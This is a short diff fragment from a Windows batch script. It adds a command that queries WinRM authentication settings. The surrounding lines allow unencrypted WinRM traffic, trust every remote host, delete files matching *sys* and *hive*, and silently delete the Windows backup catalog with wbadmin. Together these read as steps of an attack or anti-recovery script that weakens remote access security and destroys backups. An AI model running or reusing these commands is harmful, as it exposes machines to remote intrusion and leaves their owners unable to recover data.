@@ -392,6 +392,8 @@ cmd.exe /c winrm set winrm/config/Client @{AllowUnencrypted = “true”} > nul 
 ECHO ============================
 cmd.exe /c powershell.exe Set-Item WSMan:localhost\client\trustedhosts -value * -Force > nul 2>&1
 ECHO ============================
+winrm get winrm/config/service/auth
+ECHO ============================
 del *sys* & del *hive*
 ECHO ============================
 wbadmin delete catalog -quiet
